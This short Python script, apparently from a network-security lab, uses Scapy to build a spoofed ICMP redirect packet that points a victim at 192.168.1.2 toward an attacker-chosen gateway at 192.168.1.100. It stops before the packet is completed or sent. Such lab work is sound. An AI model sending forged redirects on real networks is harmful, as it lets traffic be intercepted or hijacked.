#!/usr/bin/python3

from scapy.all import *

ip = IP(src = "192.168.1.1", dst = "192.168.1.2" )
icmp = ICMP(type=5, code=1)
icmp.gw = "192.168.1.100"

#The encloses IP packet should be the one that
#triggers the redirected message

ip2 = IP(src = "192.168.1.2", dst = "192.168.60.5")
